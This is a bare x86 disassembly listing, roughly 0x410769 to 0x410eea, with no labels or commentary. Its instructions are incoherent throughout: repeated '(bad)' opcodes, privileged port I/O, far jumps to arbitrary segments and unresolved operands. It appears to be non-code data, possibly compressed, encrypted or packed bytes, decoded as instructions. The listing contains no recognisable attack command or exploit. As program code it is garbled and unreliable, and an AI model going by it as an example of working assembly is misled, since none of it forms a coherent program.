  410769:	test   al,0x28
  41076b:	cmp    eax,0x47261b6e
  410770:	or     DWORD PTR [ebp+0x23],esi
  410773:	or     al,0x43
  410775:	xor    dl,BYTE PTR [edi]
  410777:	mov    dh,0x7f
  410779:	test   DWORD PTR [edi+0x692a0f4c],eax
  41077f:	mov    ecx,?
  410781:	dec    edi
  410782:	shl    DWORD PTR [ebx+0x4774fd46],0xfb
  410789:	inc    ecx
  41078a:	jne    0x4107ec
  41078c:	aaa    
  41078d:	inc    edi
  41078e:	xchg   esp,eax
  41078f:	mov    al,0xa9
  410791:	mov    ebx,0x87eac802
  410796:	ror    bl,cl
  410798:	xor    dh,BYTE PTR [edx]
  41079a:	mov    eax,0x72467218
  41079f:	or     BYTE PTR [edx+0x5689271c],al
  4107a5:	sbb    dx,cx
  4107a8:	shl    DWORD PTR [ebx-0x1a],cl
  4107ab:	jmp    0x410752
  4107ad:	push   0x7b96adaa
  4107b2:	sar    BYTE PTR [esi+0x70],0x99
  4107b6:	mov    al,cl
  4107b8:	push   eax
  4107b9:	add    DWORD PTR [edi-0x2],ecx
  4107bc:	inc    ebx
  4107bd:	(bad)  
  4107be:	mov    ah,0xa2
  4107c0:	test   al,0x7b
  4107c2:	shr    cl,1
  4107c4:	push   ebx
  4107c5:	es jne 0x4107ba
  4107c8:	sub    eax,0x5ebe7405
  4107cd:	lock shl DWORD PTR [eax+0x36],0xdd
  4107d2:	xlat   BYTE PTR ds:[ebx]
  4107d3:	clc    
  4107d4:	in     al,0xce
  4107d6:	xor    DWORD PTR [esi+0x29],edx
  4107d9:	xchg   al,cl
  4107db:	and    ch,0x3e
  4107de:	pop    esi
  4107df:	push   ds
  4107e0:	fstp   TBYTE PTR [edx+0x64]
  4107e3:	sbb    DWORD PTR [edx],eax
  4107e5:	test   BYTE PTR [ecx-0x2b7be08a],al
  4107eb:	(bad)  
  4107ec:	fwait
  4107ed:	stos   BYTE PTR es:[edi],al
  4107ee:	enter  0xde7,0x14
  4107f2:	xor    al,0x66
  4107f4:	inc    ebx
  4107f5:	mov    bl,0x8f
  4107f7:	xchg   esi,eax
  4107f8:	jb     0x4107ac
  4107fa:	or     DWORD PTR [edi],esi
  4107fc:	jno    0x410851
  4107fe:	and    DWORD PTR [eax+0x66201fea],ebx
  410804:	cld    
  410805:	and    dh,BYTE PTR [ecx-0x47]
  410808:	leave  
  410809:	(bad)  
  41080a:	xor    esp,DWORD PTR [edi+0x36]
  41080d:	popf   
  41080e:	and    esi,DWORD PTR [eax-0x31]
  410811:	cmp    DWORD PTR [ecx+0x1b],0xffffffe0
  410815:	jnp    0x4107a5
  410817:	xlat   BYTE PTR ds:[ebx]
  410818:	aaa    
  410819:	cmp    DWORD PTR [ecx],eax
  41081b:	retf   0x8ec9
  41081e:	mov    ds:0x3184a274,al
  410823:	sub    BYTE PTR [esp+edi*2-0x2a4ff0e9],ch
  41082a:	or     ebx,DWORD PTR [esi-0x35d482f2]
  410830:	lahf   
  410831:	xchg   bh,bl
  410833:	mov    edx,esp
  410835:	cmp    DWORD PTR [ecx-0x5c],edi
  410838:	or     ebx,esi
  41083a:	(bad)  [esi]
  41083c:	int3   
  41083d:	inc    ebx
  41083e:	pop    ebp
  41083f:	mov    ebx,0xf1ae514c
  410844:	test   al,0xdd
  410846:	xlat   BYTE PTR ds:[ebx]
  410847:	dec    edx
  410848:	mov    ebx,0x31534c24
  41084d:	(bad)  
  41084e:	sub    BYTE PTR [ebx+0x7a],dh
  410851:	jb     0x410814
  410853:	mov    edi,0xb8c021cd
  410858:	dec    ebp
  410859:	fidivr DWORD PTR [eax]
  41085b:	popa   
  41085c:	push   ebx
  41085d:	jmp    FWORD PTR [eax+0x29e786cd]
  410863:	xor    ebx,DWORD PTR [ecx]
  410865:	out    dx,eax
  410866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410867:	fimul  DWORD PTR [ecx-0x76d00e52]
  41086d:	adc    DWORD PTR [edi-0x4b],ebx
  410870:	pop    edi
  410871:	sbb    ch,BYTE PTR ds:0xd34a6bd7
  410877:	mov    DWORD PTR [ebx-0x24],edx
  41087a:	sar    DWORD PTR ds:0xdde90f19,1
  410880:	xor    edx,DWORD PTR [ebp+0x22]
  410883:	shl    esp,0xd6
  410886:	mov    dh,0x58
  410888:	push   es
  410889:	xchg   esi,eax
  41088a:	sahf   
  41088b:	sub    al,0x57
  41088d:	push   ds
  41088e:	cld    
  41088f:	fild   WORD PTR ds:[ebx-0x62cac2a4]
  410896:	test   eax,0x5364ab43
  41089b:	test   al,0xc5
  41089d:	or     cl,ch
  41089f:	jae    0x41083b
  4108a1:	in     al,0xf6
  4108a3:	test   bh,cl
  4108a5:	adc    DWORD PTR ds:0x390ef0ab,esp
  4108ab:	fdiv   DWORD PTR [edi]
  4108ad:	fild   WORD PTR [esi+0x75]
  4108b0:	enter  0xc871,0x32
  4108b4:	pop    edi
  4108b5:	int    0xc2
  4108b7:	sub    ebx,DWORD PTR [edi]
  4108b9:	inc    esi
  4108ba:	mov    ds:0xf0fd3068,eax
  4108bf:	out    dx,al
  4108c0:	xor    BYTE PTR [edi],al
  4108c2:	dec    ebp
  4108c3:	sub    DWORD PTR [edi],ebp
  4108c5:	mov    ecx,0x8fff38de
  4108ca:	add    BYTE PTR [edi+0x43],dh
  4108cd:	(bad)  
  4108ce:	fwait
  4108cf:	mov    ch,0x99
  4108d1:	out    dx,eax
  4108d2:	test   DWORD PTR [ebp+0x754025bb],esp
  4108d8:	mov    es,WORD PTR [ecx+0x25]
  4108db:	ins    DWORD PTR es:[edi],dx
  4108dc:	jmp    0x4108bf
  4108de:	enter  0xb583,0x97
  4108e2:	fild   WORD PTR [edi+0x22f75d71]
  4108e8:	jbe    0x410903
  4108ea:	xchg   esi,eax
  4108eb:	mov    eax,ds:0xb7eb0773
  4108f0:	fcmovb st,st(7)
  4108f2:	or     DWORD PTR [ebx+0x4d],edi
  4108f5:	retf   
  4108f6:	mov    dl,0x57
  4108f8:	jmp    FWORD PTR [esi]
  4108fa:	repz mov al,ds:0x8a774028
  410900:	shr    DWORD PTR [ebp+0x6c],cl
  410903:	ins    BYTE PTR es:[edi],dx
  410904:	icebp  
  410905:	or     al,bl
  410907:	pop    eax
  410908:	mov    dh,0x5a
  41090a:	loopne 0x41092b
  41090c:	int    0x4
  41090e:	push   cs
  41090f:	ficomp DWORD PTR [ebp-0x5f31d407]
  410915:	(bad)  
  410916:	xor    dh,BYTE PTR [ebx-0x3b7e0ddf]
  41091c:	mov    dl,BYTE PTR [edi+0x35]
  41091f:	jmp    0x8f1a:0xc162bfa5
  410926:	leave  
  410927:	sar    DWORD PTR fs:[ebx],1
  41092a:	mov    ah,0xc8
  41092c:	and    BYTE PTR [edx],dh
  41092e:	fwait
  41092f:	mov    al,ds:0xad49d11a
  410934:	cwde   
  410935:	dec    esp
  410936:	mov    esi,DWORD PTR [ecx]
  410938:	mov    ds:0xdb05d362,eax
  41093d:	sub    al,BYTE PTR [edi]
  41093f:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  410941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410942:	push   esp
  410943:	jge    0x4108eb
  410945:	imul   ebx,DWORD PTR [ebp+0x6a],0xffffffba
  410949:	xchg   esi,eax
  41094a:	bound  ecx,QWORD PTR [edi+0x52]
  41094d:	outs   dx,DWORD PTR ds:[esi]
  41094e:	and    bl,BYTE PTR [edx+0x433e31f9]
  410954:	jecxz  0x4109ad
  410956:	popa   
  410957:	sub    eax,DWORD PTR [esi]
  410959:	cli    
  41095a:	dec    edx
  41095b:	pusha  
  41095c:	adc    DWORD PTR [ebp+0x1509ecac],ebp
  410962:	xor    ah,BYTE PTR [eax]
  410964:	imul   ecx,DWORD PTR [eax+ebx*8],0x31741ad8
  41096b:	in     al,dx
  41096c:	jnp    0x410966
  41096e:	add    eax,esp
  410970:	and    DWORD PTR [edx-0x279dc5a8],edi
  410976:	jmp    0x410918
  410978:	xchg   ebp,eax
  410979:	mov    dl,ch
  41097b:	xor    ch,BYTE PTR [ecx]
  41097d:	test   BYTE PTR [edx+0x1f04f692],ah
  410983:	sub    cl,ah
  410985:	mov    ds:0x252a205d,eax
  41098a:	mov    ds:0x3b4ecd96,al
  41098f:	sbb    DWORD PTR [edi],eax
  410991:	push   esi
  410993:	cli    
  410994:	push   ebp
  410995:	push   edx
  410996:	popf   
  410997:	stos   DWORD PTR es:[edi],eax
  410998:	das    
  410999:	int3   
  41099a:	(bad)  
  41099b:	jmp    0x82cc6744
  4109a0:	pop    ebp
  4109a1:	jg     0x41099a
  4109a3:	and    BYTE PTR [edx-0x54],ch
  4109a6:	test   al,0x39
  4109a8:	in     al,dx
  4109a9:	fistp  QWORD PTR [ebx+0x230e2978]
  4109af:	mov    ebp,0x1a51e8e2
  4109b4:	mov    ebx,0x81f186c
  4109b9:	fs and al,0x1a
  4109bc:	jo     0x4109da
  4109be:	xor    ch,BYTE PTR [edi-0x55]
  4109c1:	clc    
  4109c2:	mov    DWORD PTR [ebx-0x19],esi
  4109c5:	jae    0x410a0f
  4109c7:	pushf  
  4109c8:	cmp    bl,BYTE PTR [ecx]
  4109ca:	retf   
  4109cb:	sub    bl,dh
  4109cd:	sbb    DWORD PTR [edi-0x5f],esp
  4109d0:	add    dh,ch
  4109d2:	outs   dx,BYTE PTR ds:[esi]
  4109d3:	xchg   ebx,eax
  4109d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109d5:	mov    edi,0x2917694a
  4109da:	pop    ebx
  4109db:	jmp    0x4109ef
  4109dd:	aas    
  4109de:	lock or BYTE PTR [edx],ah
  4109e1:	xchg   BYTE PTR [ecx-0x3d],bh
  4109e4:	add    BYTE PTR [esi],al
  4109e6:	pop    edi
  4109e7:	bound  ebx,QWORD PTR [esi]
  4109e9:	stos   BYTE PTR es:[edi],al
  4109ea:	mov    ds:0xdbb1acee,eax
  4109ef:	arpl   WORD PTR [esi-0x52],di
  4109f2:	in     al,0x62
  4109f4:	das    
  4109f5:	push   ds
  4109f6:	pop    edi
  4109f7:	cmp    ah,ch
  4109f9:	scas   eax,DWORD PTR es:[edi]
  4109fa:	jle    0x4109b1
  4109fc:	cmp    BYTE PTR [esi+0x61e60ddf],dh
  410a02:	outs   dx,DWORD PTR ds:[esi]
  410a03:	loope  0x4109fc
  410a05:	scas   eax,DWORD PTR es:[edi]
  410a06:	xor    BYTE PTR [esi+0x3e],al
  410a09:	scas   eax,DWORD PTR es:[edi]
  410a0a:	(bad)  
  410a0b:	mov    esi,0xa50fdbf3
  410a10:	cmp    BYTE PTR [ebp+0x7b980882],0x7a
  410a17:	loopne 0x410a18
  410a19:	dec    ebp
  410a1a:	jae    0x410a84
  410a1c:	(bad)  
  410a1d:	jge    0x4109de
  410a1f:	arpl   bp,dx
  410a21:	test   DWORD PTR [ebx-0x3e],ebp
  410a24:	push   cs
  410a25:	inc    esp
  410a26:	xchg   esi,eax
  410a27:	push   esp
  410a28:	mov    eax,0xea6185f2
  410a2d:	pop    es
  410a2e:	and    ch,ch
  410a30:	or     al,0x2e
  410a32:	mov    WORD PTR [ebx],es
  410a34:	lods   al,BYTE PTR ds:[esi]
  410a35:	enter  0x1622,0xb6
  410a39:	lea    esi,[edi]
  410a3b:	or     bl,BYTE PTR cs:[esi]
  410a3e:	add    dl,al
  410a40:	inc    ebp
  410a41:	xor    eax,0xd05f6636
  410a46:	xor    BYTE PTR [eax-0x55d8efd7],dl
  410a4c:	cmp    ebx,DWORD PTR [eax-0x1e]
  410a4f:	fsub   DWORD PTR [ecx]
  410a51:	stos   BYTE PTR es:[edi],al
  410a52:	inc    edx
  410a53:	mov    ecx,0xe374b6db
  410a58:	sbb    DWORD PTR [ebx-0x46],eax
  410a5b:	in     al,0x6e
  410a5d:	lea    ecx,[ecx+0x89dc597]
  410a63:	ja     0x410a3f
  410a65:	(bad)  
  410a66:	mov    edx,0x273755e6
  410a6b:	les    eax,FWORD PTR [eax-0x58]
  410a6e:	ds stos DWORD PTR es:[edi],eax
  410a70:	out    0x4c,eax
  410a72:	ror    BYTE PTR [edx+0x4a],1
  410a75:	je     0x410a33
  410a77:	ins    BYTE PTR es:[edi],dx
  410a78:	fidivr DWORD PTR [edx+0x56]
  410a7b:	popf   
  410a7c:	int3   
  410a7d:	inc    eax
  410a7e:	call   0x63de:0x18ccaac3
  410a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a86:	(bad)  [ebp+0x30]
  410a89:	pushf  
  410a8a:	idiv   DWORD PTR [eax+edx*2-0x24]
  410a8e:	test   eax,0xe3bd7d23
  410a93:	inc    ebx
  410a94:	inc    ebx
  410a95:	lods   eax,DWORD PTR ds:[esi]
  410a96:	out    dx,eax
  410a97:	lea    ecx,[edi+0x1bcfc28f]
  410a9d:	push   eax
  410a9e:	leave  
  410a9f:	jbe    0x410ad6
  410aa1:	pop    edi
  410aa2:	xchg   ebp,eax
  410aa3:	pop    ebp
  410aa4:	pop    esp
  410aa5:	mov    ch,0x64
  410aa7:	scas   eax,DWORD PTR es:[edi]
  410aa8:	jnp    0x410b15
  410aaa:	push   cs
  410aab:	pop    ss
  410aac:	or     eax,0x635d9195
  410ab1:	enter  0x92f4,0x51
  410ab5:	pop    ebx
  410ab6:	pop    edx
  410ab7:	retf   0x8b16
  410aba:	icebp  
  410abb:	in     al,0x40
  410abd:	add    BYTE PTR [esi],al
  410abf:	dec    esi
  410ac0:	repnz xor edi,DWORD PTR [ecx-0x6]
  410ac4:	jecxz  0x410a4e
  410ac6:	xchg   esi,eax
  410ac7:	test   DWORD PTR [edx+0x7b],0x54593d3b
  410ace:	enter  0x34d9,0x26
  410ad2:	inc    DWORD PTR [ebx+ecx*2-0x35]
  410ad6:	(bad)  
  410ad7:	(bad)  
  410ad8:	stos   DWORD PTR es:[edi],eax
  410ad9:	pop    edi
  410ada:	dec    esp
  410adb:	in     eax,dx
  410adc:	mov    esp,0x4b22c7bf
  410ae1:	retf   0xe979
  410ae4:	sar    BYTE PTR [ebx],cl
  410ae6:	adc    bh,BYTE PTR [ebx+ebp*1+0x7778ab9]
  410aed:	gs sub al,0xf7
  410af0:	fdivp  st(5),st
  410af2:	loop   0x410b1b
  410af4:	inc    ebp
  410af5:	inc    esp
  410af6:	cmp    BYTE PTR [ecx-0x4548e8db],bl
  410afc:	mov    al,0x1f
  410afe:	xchg   BYTE PTR [ebx-0x7cd06883],bl
  410b04:	mov    dl,0x4e
  410b06:	scas   eax,DWORD PTR es:[edi]
  410b07:	sti    
  410b08:	xchg   esi,eax
  410b09:	or     esi,esp
  410b0b:	add    al,0x2c
  410b0d:	sbb    al,0xfe
  410b0f:	rcl    ebp,0xe3
  410b12:	jmp    0xbb35:0x7e85e58b
  410b19:	mov    edx,0x20c63b6d
  410b1e:	pop    ds
  410b1f:	loopne 0x410b82
  410b21:	add    al,0xe3
  410b23:	lahf   
  410b24:	(bad)  
  410b25:	hlt    
  410b26:	sbb    eax,0x145fe057
  410b2b:	iret   
  410b2c:	in     eax,dx
  410b2d:	inc    edx
  410b2e:	inc    ebp
  410b2f:	mov    ds:0xe8d24765,al
  410b34:	cmc    
  410b35:	and    eax,DWORD PTR [ecx+0x3bc6f96d]
  410b3b:	adc    BYTE PTR [esi+0x6],cl
  410b3e:	fwait
  410b3f:	sub    DWORD PTR [edi],eax
  410b41:	addr16 mov ecx,0x79d832fe
  410b47:	stos   DWORD PTR es:[edi],eax
  410b48:	int    0xe3
  410b4a:	cmp    eax,0x38f9502d
  410b4f:	inc    ebx
  410b50:	retf   
  410b51:	xor    BYTE PTR [edx+eax*2],ah
  410b54:	sub    bh,BYTE PTR [edi+edx*2-0x17]
  410b58:	fidivr DWORD PTR [ebx]
  410b5a:	mov    dl,0x7c
  410b5c:	mov    bh,0x5a
  410b5e:	mul    DWORD PTR [eax]
  410b60:	jne    0x410b0f
  410b62:	(bad)  
  410b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b66:	pushf  
  410b67:	mov    edi,0x1856b1fe
  410b6c:	add    al,0xfb
  410b6e:	mov    bh,0xc3
  410b70:	sbb    esp,DWORD PTR [eax]
  410b72:	sti    
  410b73:	call   0xcae7:0x2b26dfb1
  410b7a:	dec    eax
  410b7b:	sahf   
  410b7c:	add    esi,DWORD PTR [edx-0x4ea05b22]
  410b82:	(bad)  
  410b83:	data16 jnp 0x410b6e
  410b86:	repz dec esi
  410b88:	fldenv [ecx]
  410b8a:	(bad)  
  410b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b8c:	(bad)  
  410b8d:	sub    eax,0x6600d6da
  410b92:	mov    esi,0x6555ed4b
  410b97:	sbb    al,0xcd
  410b99:	pop    edi
  410b9a:	jns    0x410b51
  410b9c:	add    BYTE PTR [edi+edx*2+0x34473a25],dh
  410ba3:	mov    esp,0x29ff932e
  410ba8:	repnz mov esi,DWORD PTR [edi-0x1]
  410bac:	or     DWORD PTR [edx+0x2f],edi
  410baf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bb0:	sbb    eax,0xce96d026
  410bb5:	fucom  st(3)
  410bb7:	sub    dh,BYTE PTR [ebp-0x3a]
  410bba:	lds    ecx,FWORD PTR [edi+0x3f]
  410bbd:	jl     0x410c27
  410bbf:	sahf   
  410bc0:	sahf   
  410bc1:	adc    ebp,DWORD PTR [ecx]
  410bc3:	shr    BYTE PTR [ebp-0x1e],1
  410bc6:	and    DWORD PTR [esi-0x30],0x49
  410bca:	sub    ebp,edi
  410bcc:	xchg   ebx,eax
  410bcd:	sub    ah,BYTE PTR [eax-0xcba58b9]
  410bd3:	adc    ecx,0xffffff89
  410bd6:	cmp    ecx,DWORD PTR ss:[ecx]
  410bd9:	outs   dx,BYTE PTR ds:[esi]
  410bda:	jae    0x410b8d
  410bdc:	cld    
  410bdd:	jns    0x410c02
  410bdf:	fwait
  410be0:	mov    ah,0x1c
  410be2:	sub    dh,BYTE PTR [ecx]
  410be4:	cmp    ebx,DWORD PTR [eax-0x43a7e873]
  410bea:	(bad)  
  410beb:	stc    
  410bec:	dec    eax
  410bed:	mov    edx,0x7f98522a
  410bf2:	and    al,bh
  410bf4:	mov    DWORD PTR [ebx-0x52],ebp
  410bf7:	fidiv  WORD PTR fs:[edi-0x3d]
  410bfb:	hlt    
  410bfc:	add    edx,DWORD PTR [edi-0x404e6828]
  410c02:	and    bl,BYTE PTR [ebp+0x44]
  410c05:	and    esp,DWORD PTR [esi-0x39]
  410c08:	mov    esi,0x8c9ebcf4
  410c0d:	or     bh,BYTE PTR [edx]
  410c0f:	fwait
  410c10:	aas    
  410c11:	outs   dx,DWORD PTR ds:[esi]
  410c12:	dec    esp
  410c13:	iret   
  410c14:	(bad)  
  410c15:	xlat   BYTE PTR ds:[ebx]
  410c16:	mov    cl,0x3
  410c18:	gs mov ah,0xe0
  410c1b:	(bad)  
  410c1c:	mov    ah,0x6f
  410c1e:	adc    eax,0x88b021e8
  410c23:	mov    BYTE PTR [ebp+ecx*1+0x4e],ah
  410c27:	dec    eax
  410c28:	call   0xc6d95bfd
  410c2d:	sub    DWORD PTR [edx+0x44],esp
  410c30:	inc    ebp
  410c31:	in     al,0xe7
  410c33:	cmp    BYTE PTR [ebx],ah
  410c35:	retf   0x52dc
  410c38:	scas   al,BYTE PTR es:[edi]
  410c39:	xchg   edi,eax
  410c3a:	cmp    BYTE PTR [edi+edi*8+0x1a28f4fb],ah
  410c41:	jne    0x410c2d
  410c43:	mov    ds:0xb2d8e5ee,al
  410c48:	stc    
  410c49:	mov    ecx,0xb06dcafd
  410c4e:	in     eax,dx
  410c4f:	dec    esp
  410c50:	pop    ebp
  410c51:	call   0xbf03a82e
  410c56:	int3   
  410c57:	jecxz  0x410c6c
  410c59:	xchg   edx,eax
  410c5a:	pusha  
  410c5b:	retf   
  410c5c:	push   eax
  410c5d:	or     eax,0x9b9acd7d
  410c62:	pusha  
  410c63:	iret   
  410c64:	push   ecx
  410c65:	(bad)
  410c69:	jl     0x410cd8
  410c6b:	mov    ch,0x6d
  410c6d:	pop    ds
  410c6e:	ds popf 
  410c70:	mov    eax,0xd07d892
  410c75:	dec    BYTE PTR [esi]
  410c77:	icebp  
  410c78:	popa   
  410c79:	fst    DWORD PTR [esi-0x18]
  410c7c:	clc    
  410c7d:	int    0x32
  410c7f:	ror    esi,1
  410c81:	out    0x2a,eax
  410c83:	lds    ebx,FWORD PTR [esp+eax*2+0x53fa7025]
  410c8a:	fcmove st,st(3)
  410c8c:	or     ecx,DWORD PTR [esi-0x7c]
  410c8f:	aaa    
  410c90:	xchg   ecx,eax
  410c91:	fsub   st(0),st
  410c93:	or     dh,BYTE PTR [eax-0x43818fd]
  410c99:	jo     0x410cca
  410c9b:	jmp    0x410ce2
  410c9d:	xor    eax,0x1fc5f8c6
  410ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ca3:	popf   
  410ca4:	add    eax,0xdb3bbf01
  410ca9:	in     eax,0x9d
  410cab:	(bad)  
  410cac:	xchg   ebp,eax
  410cad:	out    dx,eax
  410cae:	sbb    bl,bl
  410cb0:	stos   DWORD PTR es:[edi],eax
  410cb1:	in     eax,0xee
  410cb3:	int3   
  410cb4:	dec    esi
  410cb5:	add    BYTE PTR [ecx-0x45142f0c],cl
  410cbb:	scas   eax,DWORD PTR es:[edi]
  410cbc:	(bad)  
  410cbd:	or     eax,0x6074b950
  410cc2:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cc4:	aas    
  410cc5:	outs   dx,DWORD PTR ds:[esi]
  410cc6:	shr    ecx,cl
  410cc8:	jae    0x410c99
  410cca:	and    esi,DWORD PTR [esi]
  410ccc:	fild   DWORD PTR [edx-0x6]
  410ccf:	sti    
  410cd0:	mov    cl,0x21
  410cd2:	fldcw  WORD PTR [edx+0x5e]
  410cd5:	push   edi
  410cd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd7:	lods   al,BYTE PTR ds:[esi]
  410cd8:	mov    ?,WORD PTR [edi-0x450b6812]
  410cde:	pop    ebp
  410cdf:	jle    0x410c86
  410ce1:	sbb    esi,eax
  410ce3:	inc    esi
  410ce4:	pusha  
  410ce5:	(bad)  
  410ce7:	enter  0xef0d,0x4f
  410ceb:	rcl    esp,0x98
  410cee:	xor    ebx,eax
  410cf0:	and    BYTE PTR [eax+0x6],ch
  410cf3:	jge    0x410d44
  410cf5:	dec    ebx
  410cf6:	pop    ds
  410cf7:	out    dx,eax
  410cf8:	sti    
  410cf9:	pop    ebp
  410cfa:	adc    eax,0xa6292c21
  410cff:	and    al,0x0
  410d01:	add    esi,DWORD PTR [esi]
  410d03:	pop    es
  410d04:	cmc    
  410d05:	add    eax,ebx
  410d07:	jne    0x410d52
  410d09:	arpl   WORD PTR [ecx-0x47],si
  410d0c:	in     eax,dx
  410d0d:	xchg   DWORD PTR [ecx],ebp
  410d0f:	sbb    BYTE PTR [ebx+edx*4-0x1e],bl
  410d13:	idiv   BYTE PTR [ebx+ebp*1+0x5ba50d36]
  410d1a:	mov    ecx,0x375f31b3
  410d1f:	pop    ebx
  410d20:	inc    edi
  410d21:	iret   
  410d22:	sub    dl,BYTE PTR [esi-0x15013cd5]
  410d28:	pop    eax
  410d29:	imul   edi,DWORD PTR [ebx+0x4],0xffffffe1
  410d2d:	mov    edx,0x88d4f1db
  410d32:	in     eax,0x63
  410d34:	sbb    eax,0xa6143a3d
  410d39:	cmp    al,bl
  410d3b:	div    ebx
  410d3d:	in     eax,0xd2
  410d3f:	scas   eax,DWORD PTR es:[edi]
  410d40:	out    0x1e,al
  410d42:	test   BYTE PTR [ecx-0x25],ah
  410d45:	or     al,0x18
  410d47:	retf   
  410d48:	cmp    bh,al
  410d4a:	rcr    DWORD PTR [ecx],1
  410d4c:	in     eax,0xdb
  410d4e:	mov    ebp,0x7fc80581
  410d53:	clc    
  410d54:	dec    edi
  410d55:	mov    es,WORD PTR [edi+edi*2+0x6e]
  410d59:	adc    al,0x9b
  410d5b:	mov    ds:0x7c7e629,eax
  410d60:	dec    ebx
  410d61:	fmul   QWORD PTR [edi]
  410d63:	add    BYTE PTR [edx-0x69],bh
  410d66:	mov    bh,0x22
  410d68:	jmp    0xb2a2:0xc61f695
  410d6f:	mov    ds:0x94884743,eax
  410d74:	adc    DWORD PTR [ecx+0x1e],ecx
  410d77:	test   BYTE PTR [ecx],bh
  410d79:	and    BYTE PTR [ecx+0x25],0x30
  410d7d:	xor    al,0x8c
  410d7f:	inc    edx
  410d80:	ret    
  410d81:	or     al,BYTE PTR [edx+0x75]
  410d84:	out    0xc6,al
  410d86:	gs cmp eax,0xedde8cf2
  410d8c:	call   0xa996dfea
  410d91:	inc    edi
  410d92:	loope  0x410d15
  410d94:	inc    edi
  410d95:	dec    BYTE PTR [ecx]
  410d97:	or     BYTE PTR [ebp-0x4a],0x45
  410d9b:	jbe    0x410dc0
  410d9d:	xchg   BYTE PTR [eax-0x7c1357bd],dl
  410da3:	mov    BYTE PTR [ebx+0xf89aba],ah
  410da9:	sub    edx,DWORD PTR ds:[ebx+0x52]
  410dad:	jno    0x410d8c
  410daf:	div    BYTE PTR [eax-0x49f96fc5]
  410db5:	xchg   edx,eax
  410db6:	(bad)  
  410db7:	stos   BYTE PTR es:[edi],al
  410db8:	retf   0x5d8f
  410dbb:	aaa    
  410dbc:	mov    ds:0x47604fe6,al
  410dc1:	imul   edx,DWORD PTR [ecx+0x17],0x75
  410dc5:	and    DWORD PTR [edi+0x1f94a651],0x38f63222
  410dcf:	sub    ch,BYTE PTR [ebp+edi*1+0x30]
  410dd3:	addr16 test al,0x10
  410dd6:	mov    edx,0xdc5dd3e9
  410ddb:	or     ebx,DWORD PTR ds:0x65e49354
  410de1:	cmp    eax,0x9e50bf2c
  410de6:	and    cl,BYTE PTR [ebx+0x62]
  410de9:	jbe    0x410dfb
  410deb:	imul   ebp,DWORD PTR ss:[eax-0x8e0641],0xd376467e
  410df6:	popf   
  410df7:	jg     0x410dbd
  410df9:	imul   edi,DWORD PTR cs:[ebx+edx*8],0xfffffff3
  410dfe:	pop    edx
  410dff:	push   edx
  410e00:	(bad)  
  410e01:	pop    ebx
  410e02:	and    al,0x12
  410e04:	shr    BYTE PTR [ecx-0x1d],0xb4
  410e08:	jmp    0x410def
  410e0a:	mov    ch,0x4e
  410e0c:	jge    0x410e25
  410e0e:	bound  esp,QWORD PTR [esi+0x21aa4cf8]
  410e14:	xor    bh,BYTE PTR [ebp-0x44]
  410e17:	adc    al,0x3b
  410e19:	xchg   esp,eax
  410e1a:	push   es
  410e1b:	or     DWORD PTR [ecx-0x4a],0x9
  410e1f:	or     esp,DWORD PTR ds:0x240f3c1a
  410e25:	outs   dx,BYTE PTR ds:[esi]
  410e26:	outs   dx,BYTE PTR ds:[esi]
  410e27:	push   esp
  410e28:	pusha  
  410e29:	dec    esp
  410e2a:	pop    es
  410e2b:	jnp    0x410e96
  410e2d:	ror    ebp,cl
  410e2f:	enter  0x3c53,0x5
  410e33:	pop    esi
  410e34:	and    eax,0xd1b43b05
  410e39:	sbb    al,0x8d
  410e3b:	(bad)  
  410e3c:	cs fdivrp st(0),st
  410e3f:	fldcw  WORD PTR [ebx]
  410e41:	test   BYTE PTR [esi+0x67],dl
  410e44:	cmp    BYTE PTR [eax+0x3e4c990a],ch
  410e4a:	jne    0x410e1e
  410e4c:	les    esi,FWORD PTR [esi]
  410e4e:	add    DWORD PTR [ebx],eax
  410e50:	ins    BYTE PTR es:[edi],dx
  410e51:	es mov ebx,0x6faf7efb
  410e57:	xchg   ebp,eax
  410e58:	pop    esi
  410e59:	adc    ecx,esi
  410e5b:	adc    eax,0x2b12ffc5
  410e60:	push   ds
  410e61:	imul   esi,DWORD PTR [eax+eax*2+0x1d],0x6db07758
  410e69:	fnstsw ax
  410e6b:	adc    ecx,DWORD PTR [ebp+0x63d19eb0]
  410e71:	push   es
  410e72:	and    BYTE PTR [edi+0x1ab6450f],cl
  410e78:	rol    al,1
  410e7a:	sbb    dh,BYTE PTR [ebp+ebp*4-0x58]
  410e7e:	dec    esi
  410e7f:	pop    edx
  410e80:	or     bl,BYTE PTR ds:0x4e9d7812
  410e86:	mov    edx,0x5c204d1c
  410e8b:	sar    DWORD PTR [ebp-0x1763144c],0xed
  410e92:	jge    0x410ef7
  410e94:	shl    BYTE PTR [ebp+0x22afc83],cl
  410e9a:	add    DWORD PTR [esi-0x39c859b1],ebp
  410ea0:	mov    dl,0xdb
  410ea2:	and    eax,0x377fd203
  410ea7:	sub    edi,DWORD PTR [edx+0x2f]
  410eaa:	sub    esi,DWORD PTR [edx]
  410eac:	shl    DWORD PTR [eax],0x27
  410eaf:	rep ins DWORD PTR es:[edi],dx
  410eb1:	jae    0x410e9f
  410eb3:	jne    0x410e96
  410eb5:	or     al,0x6d
  410eb7:	xor    DWORD PTR [ebx+0x378301ba],eax
  410ebd:	in     al,0x51
  410ebf:	lock xor DWORD PTR [eax+edi*2-0x7ae7a7aa],ecx
  410ec7:	(bad)  
  410ec8:	dec    ebx
  410ec9:	pop    esp
  410eca:	sub    ecx,DWORD PTR [ebx]
  410ecc:	mov    WORD PTR ds:0x85bef384,gs
  410ed2:	mov    eax,0xfaf15a56
  410ed7:	mov    bl,0x1e
  410ed9:	in     eax,0x96
  410edb:	in     al,0x2c
  410edd:	jecxz  0x410e9a
  410edf:	out    dx,eax
  410ee0:	add    ebx,ebx
  410ee2:	stc    
  410ee3:	rcr    BYTE PTR [ecx],cl
  410ee5:	jae    0x410e7c
  410ee7:	xor    al,0xfb
  410ee9:	push   ss
  410eea:	fadd   st(2),st
